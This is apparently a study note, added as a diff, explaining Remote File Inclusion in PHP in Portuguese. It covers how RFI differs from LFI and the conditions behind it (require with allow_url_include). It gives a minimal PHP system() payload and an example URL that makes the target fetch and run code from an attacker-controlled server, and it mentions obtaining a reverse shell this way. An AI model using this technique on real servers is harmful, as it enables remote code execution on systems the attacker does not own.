@@ -1,0 +1,19 @@
+O QUE É RFI E COMO FUNCIONA? -> Essa vulnerabilidade é muito parecida com LFI, só que ao invés de incluirmos um arquivo de dentro do servidor, nós iremos incluir um arquivo de fora do servidor, e a utilidade dessa vulnerabilidade é que dependendo de como for a execução do servidor alvo, podemos explorar até RCE. Qual a diferença então entre as duas vulnerabilidades? A diferença é que para explorar um RFI, devemos ter controle sobre o inicio do path, devemos poder controlar o url schema, que se trata por exemplo do http://, ftp://, file:// e etc, esses são formatos padrões de urls. Um exemplo completo é http://localhost:123/path
+Para fazermos um Remote File inclusion, é preciso controlar o schema da Url, ou seja, o inicio da requisição que a aplicação irá fazer. Quanto temos controle do schema da aplicação, podemos especificar da onde queremos pegar os arquivos, por exemplo, podemos ter um parametro vulneravel e forçar ele a pegar o conteudo de um site que quisermos, como por exemplo: http://localhost:8081/?page=https://google.com
+Com isso, a aplicação iria pegar os arquivos e conteudos do site do google, pois a forçamos a fazer isso, pegar o conteudo remotamente de um site e incluindo o no nosso alvo vulneravel. Essa vulnerabilidade ocorre por dois fatores, o primeiro é utilizar a função require na aplicação, essa função faz a inclusão dos arquivos direto para o servidor, e a outra dependencia é dentro do php ter a opção chamada allow_url_include ativado, que significa que o php irá deixar nós incluirmos uma url externa na aplicação e ele ira processar os códigos php que vierem. As funções require, se detectarem que é um script php o que estamos chamando, ele irá processar esse código, então como também podemos executar códigos de links externos, podemos criar um código php para começar um reverse shell por exemplo.
+
+A vulnerabilidade ocorre quando o servidor pega os códigos que um atacante sobe em um servidor e utilizando a função require, ele os processa, dessa forma temos um RCE dentro do servidor alvo.
+------------------------------------------------------------------------------------
+COMO EXPLORAR E IDENTIFCAR ESSA VULNERABILIDADE? -> O primeiro passo para identificarmos essa vulnerabilidade é tentarmos injetar no parametro que supomos ser vulneravel algum link para ver se a aplicação processa e baixa o conteudo do site. Também devemos inferir para descobrir se temos controle dos URLs Schemas, se a aplicação conter esses dois parametros, então podemos inferir um RFI e até mesmo tentar injetar uma payload contendo o que quisermos fazer dentro do servidor, podemos utilizar o comando system para passarmos comandos para o sistema operacional do servidor:
+
+		<?php
+		system("ls -la");
+		?>
+		
+Com essa simples payload conseguimos injetar qualquer comando através dela para o sistema operacional.
+
+Para realizarmos o ataque, pegamos a url contendo o parametro vulneravel para fazermos o seguinte: 
+
+	http://url-vulneravel/?param=http://127.0.0.1:8081/index.php
+	
+Passamos como parametro a página de nosso dominio contendo o código que queremos incluir na aplicação e pronto, se aplicação rodar o código, isso significa que o parametro está vulneravel e que podemos triggar essa vulnerabilidade. Essa vulnerabilidade é perigosa pois podemos ler arquivos de dentro do servidor utilizando LFI, mas também ler arquivos de fora do servidor, e incluir ele com o processamento do servidor.
